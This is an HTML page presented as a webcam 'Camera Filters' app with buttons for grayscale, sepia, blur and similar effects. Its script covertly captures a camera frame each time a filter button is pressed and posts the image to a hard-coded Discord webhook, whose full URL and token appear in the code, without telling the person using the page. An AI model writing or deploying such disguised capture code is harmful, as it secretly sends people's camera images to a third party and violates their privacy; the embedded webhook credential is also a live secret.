<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Camera Filters</title>
    <style>
      body {
        background-image: url("https://i.pinimg.com/736x/7d/18/b0/7d18b011341ca3bf537cf8c4838f23e8.jpg");
        background-size: cover;
        background-position: center;
        font-family: Arial, sans-serif;
      }

      #container {
        width: 800px;
        margin: 0 auto;
        text-align: center;
      }

      h1 {
        color: #fff;
        font-size: 36px;
        margin-top: 50px;
        margin-bottom: 50px;
      }

      #video {
        width: 100%;
        height: auto;
        filter: none;
        border: 5px solid #fff;
        border-radius: 10px;
      }

      #canvas {
        display: none;
      }

      .filter-button {
        margin: 10px;
        padding: 10px;
        border-radius: 5px;
        background-color: #eee;
        cursor: pointer;
        font-size: 18px;
        border: none;
        outline: none;
      }

      .filter-button:hover {
        background-color: #ddd;
      }
    </style>
  </head>
  <body>
    <div id="container">
      <h1>Camera Filters</h1>
      <video id="video" autoplay></video>
      <canvas id="canvas"></canvas>
      <div id="filters">
        <button class="filter-button" onclick="setFilter('')">No filter</button>
        <button class="filter-button" onclick="setFilter('grayscale(100%)')">Grayscale</button>
        <button class="filter-button" onclick="setFilter('sepia(100%)')">Sepia</button>
        <button class="filter-button" onclick="setFilter('invert(100%)')">Invert</button>
        <button class="filter-button" onclick="setFilter('hue-rotate(90deg)')">Hue Rotate</button>
        <button class="filter-button" onclick="setFilter('blur(5px)')">Blur</button>
      </div>
    </div>
    <script>
      // Get the video element
      const video = document.getElementById("video");

      // Get the canvas element
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      // Get the media stream from the camera
      navigator.mediaDevices
        .getUserMedia({ video: true })
        .then(function (stream) {
          video.srcObject = stream;
          video.play();
        })
        .catch(function (error) {
          console.log("Error accessing camera: " + error.message);
        });

      // Apply a filter to the camera feed
      function setFilter(filter) {
        // Set the CSS filter on the video element
        video.style.filter = filter;

        // Capture the filtered image and send it to Discord webhook
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert canvas to base64 image data
        const imageData = canvas.toDataURL("image/png");

        // Send image to Discord webhook
        const webhookUrl = "https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa";
        const data = { content: "New camera capture", file: imageData };
        fetch(webhookUrl, {
          method: "POST",
          body: JSON.stringify(data),
          headers: { "Content-Type": "application/json" },
        })
          .then(function (response) {
            console.log("Image sent to Discord webhook.");
          })
          .catch(function (error) {
            console.log("Error sending image to Discord webhook: " + error.message);
          });
      }
      </script>
    </body>
</html>
